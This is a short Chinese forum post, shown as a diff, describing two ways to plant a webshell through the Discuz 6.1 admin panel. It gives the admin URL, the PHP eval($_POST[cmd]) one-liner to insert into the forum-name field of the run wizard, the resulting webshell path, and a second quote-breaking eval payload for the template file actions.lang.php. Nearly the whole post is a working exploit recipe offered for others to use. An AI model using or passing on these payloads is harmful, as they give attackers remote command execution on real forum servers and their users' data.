@@ -1,0 +1,14 @@
+discuz6.1两种方法后台拿shell
+好多朋友说discuz6.1后台不会拿shell,在前段时间这些都是说不公布的东西,我发出来给大家测试一下
+1:
+http://127.0.0.1/discuz/admincp.php?action=runwizard&frames=yes
+admincp.php?action=runwizard&frames=yes点击下一步然后再论坛名称的地方插入webshell
+<?php eval($_POST[cmd]);?>
+后台webshell地址：http://127.0.0.1/discuz/forumdata/logs/runwizardlog.php
+
+
+2:后台模板管理--默认模板套系--详情
+templates/default/actions.lang.php
+jhackj\\');eval($_POST[cmd])?>;//
+
+利用很简单,聪明的人一看就懂了
